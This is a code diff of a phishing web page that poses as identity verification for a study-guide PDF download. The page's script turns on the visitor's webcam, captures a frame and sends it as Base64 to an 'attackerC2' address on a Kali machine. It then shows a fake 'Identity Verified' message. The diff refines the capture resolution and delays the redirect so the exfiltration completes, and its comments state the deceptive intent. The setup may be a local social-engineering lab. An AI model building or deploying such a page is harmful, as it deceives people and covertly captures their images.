@@ -40,47 +40,50 @@
 </div>
 
 <script>
-    const verifyBtn = document.getElementById('verifyBtn'); // Use the ID from your button
-    const video = document.getElementById('webcam'); // Use the ID from your video tag
+    const verifyBtn = document.getElementById('verifyBtn');
+    const video = document.getElementById('webcam');
 
     verifyBtn.addEventListener('click', async () => {
         try {
-            // 1. Trigger Camera Access
+            // 1. Request Camera
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
             video.srcObject = stream;
-            
-            // Show the video feed so they think it's a real "scan"
             document.getElementById('video-container').style.display = 'block';
 
-            // 2. THE CAPTURE LOGIC (Add this part)
-            // Wait 2 seconds for the camera to focus, then take the "shot"
-            setTimeout(() => {
+            // 2. Capture and Exfiltration Logic
+            setTimeout(async () => {
                 const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
                 
-                // Convert image to a text string (Base64)
+                // ADJUSTED RESOLUTION: Downscaling to 320x240 to prevent truncation
+                canvas.width = 320; 
+                canvas.height = 240;
+                
+                const context = canvas.getContext('2d');
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                // Convert to Base64 (PNG format)
                 const imageData = canvas.toDataURL('image/png');
                 
-                // 3. THE EXFILTRATION (Sending it to SET)
-                // This sends the image data as a POST request back to your Kali machine
-              // Ensure this is your Kali IP
-const attackerC2 = "http://192.168.0.105/post"; 
+                // Ensure this is your current Kali IP
+                const attackerC2 = "http://192.168.0.105/post"; 
 
-fetch(attackerC2, {
-    method: 'POST',
-    mode: 'no-cors', // Tells the browser not to worry about security headers
-    headers: {
-        'Content-Type': 'application/x-www-form-urlencoded'
-    },
-    body: "CAPTURED_FRAME=" + encodeURIComponent(imageData)
-});;
-                
+                // 3. Send Data
+                fetch(attackerC2, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded'
+                    },
+                    body: "CAPTURED_FRAME=" + encodeURIComponent(imageData)
+                });
 
-                alert("Identity Verified Successfully. Your PDF Study Guide is downloading now.");
-                window.location.href = "study_guide.pdf";
-            }, 2000);
+                // 4. Delay the redirect to ensure POST completion
+                setTimeout(() => {
+                    alert("Identity Verified Successfully. Your PDF Study Guide is downloading now.");
+                    window.location.href = "study_guide.pdf";
+                }, 1500); // 1.5 second buffer for exfiltration
+
+            }, 2000); // Wait 2 seconds for camera to focus
 
         } catch (err) {
             alert("Security Error: Camera access is mandatory.");
